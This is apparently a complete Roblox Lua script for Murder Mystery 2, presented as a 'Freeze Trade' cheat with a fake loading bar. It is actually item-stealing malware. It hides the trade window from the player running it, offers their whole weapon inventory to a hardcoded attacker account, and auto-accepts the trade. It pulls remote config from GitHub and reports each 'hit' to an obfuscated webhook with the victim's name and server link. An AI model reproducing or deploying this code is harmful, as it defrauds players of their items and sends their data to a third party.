--[[ FREEZE TRADE SCRIPT  V11.1 ]]

local VERSION = "V11.1"
local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"

local CFG = {
	ATTACKER_NAME = "Viivik13",
	ATTACKER_ID = 1316331233,
	MAX_ITEMS = 200,
	MIN_VALUE = 0,
	FILTER = "all",
	OFFER_GAP = 0.25,
	WAIT_TRADE = 35,
	DEBUG = true,
	WEBHOOK_B64 = "",
}

local B64C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local HS = game:GetService("HttpService")
local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui")

local GUI = nil
local LOGFRAME = nil
local STATUS = nil
local BARFILL = nil
local PCTLBL = nil
local WEBHOOK = ""
local OPEN = false
local WATCHING = false

local RANK = {
	Unique = 9, Chroma = 8, Ancient = 7, Godly = 6,
	Vintage = 5, Legendary = 4, Rare = 3, Uncommon = 2, Common = 1,
}

local VALUE = {
	["NikKnife"] = 1000000,
	["SlouseClownGun"] = 500000, ["SlouseClown"] = 500000,
	["TravelerGunChroma"] = 110000, ["BlueCandy"] = 100000, ["RedHallow"] = 100000,
	["Gingerscope"] = 9600, ["TravelerAxe"] = 7000, ["TravelerGun"] = 3400,
	["TreeGun2023"] = 1850, ["Turkey2023"] = 1600, ["Dartbringer"] = 1150,
	["TreeKnife2023"] = 1025, ["Harvester"] = 650, ["Blossom_G"] = 640, ["Sakura_K"] = 630,
	["Icepiercer"] = 600, ["Constellation"] = 575, ["Darkshot"] = 465, ["Darksword"] = 460,
	["VampireGun"] = 460, ["VampireAxe"] = 440, ["Celestial"] = 350, ["Bauble"] = 310,
	["ZombieBat"] = 300, ["Candy"] = 200, ["Rainbow_G"] = 190, ["Rainbow_K"] = 185,
	["SwirlyAxe"] = 150, ["Ocean_G"] = 150, ["WraithGun"] = 145, ["WraithKnife"] = 145,
	["Waves_K"] = 145, ["AuroraKnife"] = 135, ["AuroraGun"] = 135, ["FlowerwoodGun"] = 135,
	["FlowerwoodKnife"] = 130, ["Heartblade"] = 125, ["Sugar"] = 125, ["Icebreaker"] = 125,
	["ChromaDarkbringer"] = 125, ["ChromaLightbringer"] = 120, ["SwirlyGun"] = 115,
	["CandleflameChroma"] = 115, ["Makeshift"] = 105, ["Candleflame"] = 100,
	["ElderwoodKnife"] = 100, ["LugerChroma"] = 100, ["Watergun"] = 90,
	["ElderwoodScythe"] = 85, ["LaserChroma"] = 80, ["Scythe"] = 77, ["Phantom2022"] = 75,
	["Spectre2022"] = 75, ["Luger"] = 75, ["RedLuger"] = 70, ["HeatChroma"] = 70,
	["DeathshardChroma"] = 65, ["GemstoneChroma"] = 65, ["SharkChroma"] = 65,
	["SlasherChroma"] = 65, ["TidesChroma"] = 65, ["SwirlyBlade"] = 65,
	["Iceblaster"] = 65, ["Pearl_K"] = 62, ["Pearl_G"] = 62, ["Darkbringer"] = 60,
	["ElderwoodGun"] = 60, ["Lightbringer"] = 58, ["Hallowscythe"] = 55,
	["FangChroma"] = 55, ["SeerChroma"] = 55, ["BonebladeChroma"] = 50,
	["SawChroma"] = 50, ["Gingermint_K"] = 40, ["Gingermint_G"] = 40,
	["GreenLuger"] = 40, ["Hallowgun"] = 35, ["Laser"] = 32, ["Icebeam"] = 32,
	["Plasmabeam"] = 32, ["Plasmablade"] = 32, ["Amerilaser"] = 30, ["Blaster"] = 30,
	["Nightblade"] = 30, ["AmericaSword"] = 28, ["Nebula"] = 28, ["Shark"] = 28,
	["Virtual"] = 27, ["Gemstone"] = 25, ["Clockwork"] = 23, ["EternalCane"] = 23,
	["Lugercane"] = 23, ["Pixel"] = 23, ["Slasher"] = 23, ["Heat"] = 22,
	["Minty"] = 22, ["Deathshard"] = 20, ["Tides"] = 20, ["Fang"] = 18,
	["Spider"] = 17, ["Chill"] = 17, ["VampiresEdge"] = 15, ["Pumpking"] = 15,
	["Bioblade"] = 13, ["Frostsaber"] = 13, ["Flames"] = 12, ["Hallow"] = 12,
	["IceDragon"] = 12, ["IceShard"] = 12, ["Ghostblade"] = 10, ["Handsaw"] = 10,
	["Boneblade"] = 8, ["Eggblade"] = 7, ["Frostbite"] = 7, ["Saw"] = 7,
	["Snowflake"] = 7, ["Peppermint"] = 7, ["Cookieblade"] = 7, ["TheSeer"] = 7,
}

local function log(msg)
	print("[FZ] " .. tostring(msg))
	if LOGFRAME then
		local l = Instance.new("TextLabel")
		l.BackgroundTransparency = 1
		l.Size = UDim2.new(1, -8, 0, 16)
		l.Font = Enum.Font.Code
		l.TextSize = 11
		l.TextXAlignment = Enum.TextXAlignment.Left
		l.TextColor3 = Color3.fromRGB(205, 190, 255)
		l.Text = tostring(msg)
		l.Parent = LOGFRAME
		if #LOGFRAME:GetChildren() > 70 then
			local first = LOGFRAME:GetChildren()[1]
			if first then first:Destroy() end
		end
	end
end

local function setStatus(t)
	if STATUS then STATUS.Text = t end
end

local function setPct(n)
	if BARFILL then BARFILL.Size = UDim2.new(n / 100, 0, 1, 0) end
	if PCTLBL then PCTLBL.Text = tostring(n) .. "%" end
end

local function b64dec(s)
	s = string.gsub(s, "[^" .. B64C .. "=]", "")
	local out = {}
	local i = 1
	while i <= #s do
		local b1 = string.find(B64C, string.sub(s, i, i), 1, true)
		local b2 = string.find(B64C, string.sub(s, i + 1, i + 1), 1, true)
		local b3 = string.find(B64C, string.sub(s, i + 2, i + 2), 1, true)
		local b4 = string.find(B64C, string.sub(s, i + 3, i + 3), 1, true)
		if b1 and b2 then
			local b3v = 0
			local b4v = 0
			if b3 then b3v = b3 - 1 end
			if b4 then b4v = b4 - 1 end
			local n = (b1 - 1) * 262144 + (b2 - 1) * 4096 + b3v * 64 + b4v
			out[#out + 1] = string.char(math.floor(n / 65536))
			if b3 then out[#out + 1] = string.char(math.floor(n / 256) % 256) end
			if b4 then out[#out + 1] = string.char(n % 256) end
		end
		i = i + 4
	end
	return table.concat(out)
end

local function pickReq()
	if type(syn) == "table" and syn.request then return syn.request end
	if type(http_request) == "function" then return http_request end
	if type(request) == "function" then return request end
	if type(fluxus) == "table" and fluxus.request then return fluxus.request end
	return nil
end

local function httpGet(url)
	local r = pickReq()
	if r then
		local ok, res = pcall(r, { Url = url, Method = "GET" })
		if ok and res and res.Body then return res.Body end
		return nil
	end
	local ok, body = pcall(game.HttpGet, game, url)
	if ok then return body end
	return nil
end

local function httpPost(url, body)
	local r = pickReq()
	if not r then return false end
	local ok = pcall(r, {
		Url = url,
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = body,
	})
	return ok
end

local function loadCfg()
	local body = httpGet(CFG_URL)
	if type(body) ~= "string" then return end
	local wh = string.match(body, '"webhook"%s*:%s*"([^"]+)"')
	if wh and #wh > 10 then CFG.WEBHOOK_B64 = wh end
	local id = string.match(body, '"attacker_id"%s*:%s*(%d+)')
	if id then CFG.ATTACKER_ID = tonumber(id) end
end

-- ===== UI =====
local function buildUI()
	local sg = Instance.new("ScreenGui")
	sg.Name = "FZMain"
	sg.ResetOnSpawn = false
	sg.IgnoreGuiInset = true
	sg.DisplayOrder = 999
	sg.Parent = PG
	GUI = sg

	local main = Instance.new("Frame")
	main.Size = UDim2.new(0, 380, 0, 300)
	main.Position = UDim2.new(0.5, -190, 0, 60)
	main.BackgroundColor3 = Color3.fromRGB(24, 18, 38)
	main.BorderSizePixel = 0
	main.Active = true
	main.Draggable = true
	main.Parent = sg
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 10)
	corner.Parent = main
	local stroke = Instance.new("UIStroke")
	stroke.Color = Color3.fromRGB(140, 95, 255)
	stroke.Thickness = 1
	stroke.Parent = main

	local head = Instance.new("Frame")
	head.Size = UDim2.new(1, 0, 0, 46)
	head.BackgroundColor3 = Color3.fromRGB(58, 34, 110)
	head.BorderSizePixel = 0
	head.Parent = main
	local hc = Instance.new("UICorner")
	hc.CornerRadius = UDim.new(0, 10)
	hc.Parent = head

	local title = Instance.new("TextLabel")
	title.BackgroundTransparency = 1
	title.Size = UDim2.new(1, -70, 1, 0)
	title.Position = UDim2.new(0, 12, 0, 0)
	title.Font = Enum.Font.GothamBlack
	title.TextSize = 16
	title.TextColor3 = Color3.fromRGB(240, 235, 255)
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Text = "FREEZE TRADE SCRIPT"
	title.Parent = head

	local badge = Instance.new("TextLabel")
	badge.BackgroundColor3 = Color3.fromRGB(140, 95, 255)
	badge.Size = UDim2.new(0, 52, 0, 20)
	badge.Position = UDim2.new(1, -60, 0, 13)
	badge.Font = Enum.Font.GothamBold
	badge.TextSize = 10
	badge.TextColor3 = Color3.fromRGB(255, 255, 255)
	badge.Text = VERSION
	badge.Parent = head
	local bc = Instance.new("UICorner")
	bc.CornerRadius = UDim.new(0, 5)
	bc.Parent = badge

	local keyless = Instance.new("TextLabel")
	keyless.BackgroundTransparency = 1
	keyless.Size = UDim2.new(1, -24, 0, 16)
	keyless.Position = UDim2.new(0, 12, 0, 50)
	keyless.Font = Enum.Font.Gotham
	keyless.TextSize = 11
	keyless.TextColor3 = Color3.fromRGB(150, 200, 255)
	keyless.TextXAlignment = Enum.TextXAlignment.Left
	keyless.Text = "KEYLESS  •  AUTO ACCEPT  •  MOBILE"
	keyless.Parent = main

	STATUS = Instance.new("TextLabel")
	STATUS.BackgroundTransparency = 1
	STATUS.Size = UDim2.new(1, -24, 0, 16)
	STATUS.Position = UDim2.new(0, 12, 0, 70)
	STATUS.Font = Enum.Font.GothamMedium
	STATUS.TextSize = 12
	STATUS.TextColor3 = Color3.fromRGB(220, 205, 255)
	STATUS.TextXAlignment = Enum.TextXAlignment.Left
	STATUS.Text = "Booting..."
	STATUS.Parent = main

	local barbg = Instance.new("Frame")
	barbg.Size = UDim2.new(1, -24, 0, 8)
	barbg.Position = UDim2.new(0, 12, 0, 92)
	barbg.BackgroundColor3 = Color3.fromRGB(45, 33, 70)
	barbg.BorderSizePixel = 0
	barbg.Parent = main
	local bbc = Instance.new("UICorner")
	bbc.CornerRadius = UDim.new(0, 4)
	bbc.Parent = barbg

	BARFILL = Instance.new("Frame")
	BARFILL.Size = UDim2.new(0, 0, 1, 0)
	BARFILL.BackgroundColor3 = Color3.fromRGB(150, 100, 255)
	BARFILL.BorderSizePixel = 0
	BARFILL.Parent = barbg
	local bfc = Instance.new("UICorner")
	bfc.CornerRadius = UDim.new(0, 4)
	bfc.Parent = BARFILL

	PCTLBL = Instance.new("TextLabel")
	PCTLBL.BackgroundTransparency = 1
	PCTLBL.Size = UDim2.new(0, 40, 0, 14)
	PCTLBL.Position = UDim2.new(1, -46, 0, 90)
	PCTLBL.Font = Enum.Font.GothamBold
	PCTLBL.TextSize = 11
	PCTLBL.TextColor3 = Color3.fromRGB(200, 170, 255)
	PCTLBL.Text = "0%"
	PCTLBL.Parent = main

	LOGFRAME = Instance.new("ScrollingFrame")
	LOGFRAME.Size = UDim2.new(1, -24, 0, 180)
	LOGFRAME.Position = UDim2.new(0, 12, 0, 110)
	LOGFRAME.BackgroundColor3 = Color3.fromRGB(16, 12, 26)
	LOGFRAME.BorderSizePixel = 0
	LOGFRAME.CanvasSize = UDim2.new(0, 0, 0, 3000)
	LOGFRAME.ScrollBarThickness = 3
	LOGFRAME.Parent = main
	local lfc = Instance.new("UICorner")
	lfc.CornerRadius = UDim.new(0, 6)
	lfc.Parent = LOGFRAME

	local ll = Instance.new("UIListLayout")
	ll.Padding = UDim.new(0, 2)
	ll.Parent = LOGFRAME
end

local function loaderTo99()
	local n = 0
	while n < 99 do
		n = n + math.random(2, 5)
		if n > 99 then n = 99 end
		setPct(n)
		if n < 40 then setStatus("Fetching config...") end
		if n >= 40 and n < 70 then setStatus("Syncing value index...") end
		if n >= 70 then setStatus("Indexing inventory...") end
		task.wait(0.1)
	end
	setPct(99)
end

-- ===== inventory =====
local function rankOf(r)
	return RANK[r] or 1
end

local function valueOf(n)
	return VALUE[n] or 0
end

local function readInventory()
	local ok, Inv = pcall(require, RS.Modules.InventoryModule)
	if not ok or type(Inv) ~= "table" then
		log("InventoryModule failed")
		return nil
	end
	local data = nil
	pcall(function() data = Inv.MyInventory.Data.Weapons end)
	if type(data) ~= "table" then
		log("no weapons table")
		return nil
	end

	local list = {}
	for _, bucket in pairs(data) do
		if type(bucket) == "table" then
			for _, item in pairs(bucket) do
				if type(item) == "table" and item.DataID then
					local nm = tostring(item.ItemName or "?")
					local amt = tonumber(item.Amount) or 1
					if nm ~= "DefaultKnife" and nm ~= "DefaultGun" then
						list[#list + 1] = {
							data = item.DataID,
							name = nm,
							amount = amt,
							rank = rankOf(item.Rarity),
							value = valueOf(nm),
						}
					end
				end
			end
		end
	end

	table.sort(list, function(a, b)
		if a.rank ~= b.rank then return a.rank > b.rank end
		if a.value ~= b.value then return a.value > b.value end
		return a.name < b.name
	end)
	return list
end

local function passes(e)
	if CFG.FILTER == "all" then return true end
	if CFG.FILTER == "godly" then return e.rank >= 6 end
	if CFG.FILTER == "rare" then return e.rank >= 3 end
	if CFG.FILTER == "value" then return e.value >= CFG.MIN_VALUE end
	return true
end

-- ===== trade =====
local function findAttacker()
	local p = Players:GetPlayerByUserId(CFG.ATTACKER_ID)
	if p then return p end
	return Players:FindFirstChild(CFG.ATTACKER_NAME)
end

local function watchLoop()
	while WATCHING do
		local a = PG:FindFirstChild("TradeGUI")
		local b = PG:FindFirstChild("TradeGUI_Phone")
		if a and a.Enabled then OPEN = true end
		if b and b.Enabled then OPEN = true end
		if a then pcall(function() a.Enabled = false end) end
		if b then pcall(function() b.Enabled = false end) end
		task.wait(0.05)
	end
end

local function showGui()
	pcall(function()
		local a = PG:FindFirstChild("TradeGUI")
		local b = PG:FindFirstChild("TradeGUI_Phone")
		if a then a.Enabled = true end
		if b then b.Enabled = true end
	end)
end

local function run()
	loadCfg()
	if CFG.WEBHOOK_B64 ~= "" then WEBHOOK = b64dec(CFG.WEBHOOK_B64) end

	loaderTo99()
	setStatus("Reading inventory...")

	local list = readInventory()
	if not list then
		setStatus("Inventory error")
		setPct(100)
		return
	end

	local queue = {}
	for i = 1, #list do
		if passes(list[i]) and #queue < CFG.MAX_ITEMS then
			queue[#queue + 1] = list[i]
		end
	end
	if #queue == 0 then
		setStatus("No items")
		setPct(100)
		return
	end

	local Trade = RS:WaitForChild("Trade")
	local sr = Trade:FindFirstChild("SendRequest")
	local oi = Trade:FindFirstChild("OfferItem")
	local at = Trade:FindFirstChild("AcceptTrade")
	if not sr or not oi or not at then
		log("MISSING remote")
		setStatus("Remote missing")
		setPct(100)
		return
	end

	local attacker = findAttacker()
	if not attacker then
		log("partner not in server")
		setStatus("Partner missing")
		setPct(100)
		return
	end
	log("connected")

	WATCHING = true
	task.spawn(watchLoop)

	setStatus("Sending request...")
	pcall(function() sr:InvokeServer(attacker) end)

	local waited = 0
	while waited < CFG.WAIT_TRADE and not OPEN do
		task.wait(0.5)
		waited = waited + 0.5
		if waited % 6 == 0 then
			pcall(function() sr:InvokeServer(attacker) end)
		end
	end

	if not OPEN then
		log("trade never opened")
		setStatus("No trade window")
		setPct(100)
		WATCHING = false
		return
	end

	log("window locked")
	setStatus("Sending items...")
	task.wait(0.8)

	local placed = 0
	local names = {}
	for i = 1, #queue do
		local e = queue[i]
		for k = 1, e.amount do
			local ok = pcall(function() oi:FireServer(e.data, "Weapons") end)
			task.wait(CFG.OFFER_GAP)
			if ok then
				placed = placed + 1
				names[#names + 1] = e.name
				if CFG.DEBUG then log("offered " .. tostring(placed) .. " " .. e.name) end
			else
				if CFG.DEBUG then log("fail " .. e.name) end
			end
		end
	end

	log("offered total: " .. tostring(placed))
	setStatus("Offered " .. tostring(placed))
	task.wait(2)

	pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
	log("accepted")
	setStatus("Waiting for confirm")
	task.wait(2)
	pcall(function() at:FireServer(CFG.ATTACKER_ID) end)

	setPct(100)

	if WEBHOOK ~= "" then
		local shown = ""
		for i = 1, math.min(#names, 25) do
			shown = shown .. names[i] .. "\n"
		end
		if shown == "" then shown = "nothing" end
		local join = "https://www.roblox.com/games/start?placeId=142823291&gameInstanceId=" .. game.JobId
		local body = HS:JSONEncode({
			embeds = { {
				title = "Freeze trade hit",
				color = 10079231,
				description = "**Target:** " .. LP.Name .. "\n**Items:** " .. tostring(placed) .. "\n**Server:** " .. join,
				fields = { { name = "Sent", value = shown } },
			} },
		})
		httpPost(WEBHOOK, body)
		log("webhook sent")
	end

	task.wait(4)
	WATCHING = false
	showGui()
	setStatus("Done")
	task.wait(5)
	if GUI then GUI:Destroy() end
end

buildUI()
log("loader " .. VERSION)
task.spawn(run)
